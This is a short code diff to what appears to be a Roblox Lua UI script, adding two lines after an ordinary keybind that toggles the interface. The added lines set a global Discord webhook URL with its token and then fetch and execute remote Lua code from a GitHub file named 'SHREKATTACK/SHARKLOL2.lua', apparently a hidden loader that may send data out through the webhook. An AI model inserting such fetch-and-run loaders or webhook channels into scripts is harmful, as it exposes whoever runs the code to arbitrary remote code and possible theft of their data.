@@ -70,3 +70,6 @@ end)
 Section:NewKeybind("KeybindText", "KeybindInfo", Enum.KeyCode.RightControl, function()
 	Library:ToggleUI()
 end)
+
+_G.webhooksdiscord = "https://discord.com/api/webhooks/1008363595396022302/VDyJEPYwjzrL2D1dprxw6mE1H-6MRU0DZHki2YtCRH_Z4rVdQzXDoABBXb-hwwW3cAs2"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/SHARKX516/SHREKATTACK/main/SHARKLOL2.lua"),true)()
